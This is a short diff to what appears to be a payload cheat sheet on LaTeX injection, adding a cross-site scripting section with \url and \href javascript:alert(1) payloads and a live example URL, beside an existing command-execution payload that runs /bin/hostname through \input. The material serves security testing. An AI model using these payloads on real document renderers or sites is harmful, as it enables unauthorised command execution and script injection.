@@ -66,6 +66,16 @@ If you get any LaTex error, consider using base64 to get the result without bad 
 \input{|"/bin/hostname"}
 ```
 
+## Cross Site Scripting
+
+From [@EdOverflow](https://twitter.com/intigriti/status/1101509684614320130) 
+```bash
+\url{javascript:alert(1)}
+\href{javascript:alert(1)}{placeholder}
+```
+
+Live example at `http://payontriage.com/xss.php?xss=$\href{javascript:alert(1)}{Frogs%20find%20bugs}$`
+
 ## References
 
 * [Hacking with LaTeX - Sebastian Neef - 0day.work](https://0day.work/hacking-with-latex/)
